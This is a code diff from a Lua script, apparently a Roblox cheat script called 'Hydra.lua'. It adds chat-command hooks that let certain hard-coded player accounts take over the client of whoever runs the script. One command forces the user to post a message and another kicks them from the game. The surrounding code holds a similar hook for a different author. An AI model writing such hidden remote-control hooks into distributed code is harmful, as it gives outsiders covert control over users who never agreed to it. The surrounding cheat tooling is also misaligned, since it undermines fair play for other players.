@@ -6582,6 +6582,14 @@ v.Chatted:Connect(function(msg)
 				    end
                 end  
 
+		if string.sub(msg:lower(), 0, 4) == "-hrc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "dawninja21" or v.Name == "dawninja21alt" or v.Name == "darkmadeboy") then
+                                Speak("[Hydra.lua]: Hydra.lua on top!")
+                end
+
+                if string.sub(msg:lower(), 0, 4) == "-hrk" and v.Name ~= game.Players.LocalPlayer.Name and v.Name == "dawninja21" then
+                                game.Players.LocalPlayer:Kick("[Hydra.lua]: DarkSpecies has kicked you from the game.")
+		end
+
                 if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and v.Name == "atprog" then
                                  Speak("[PR Script]: atprog is my daddy fr!")
                 end
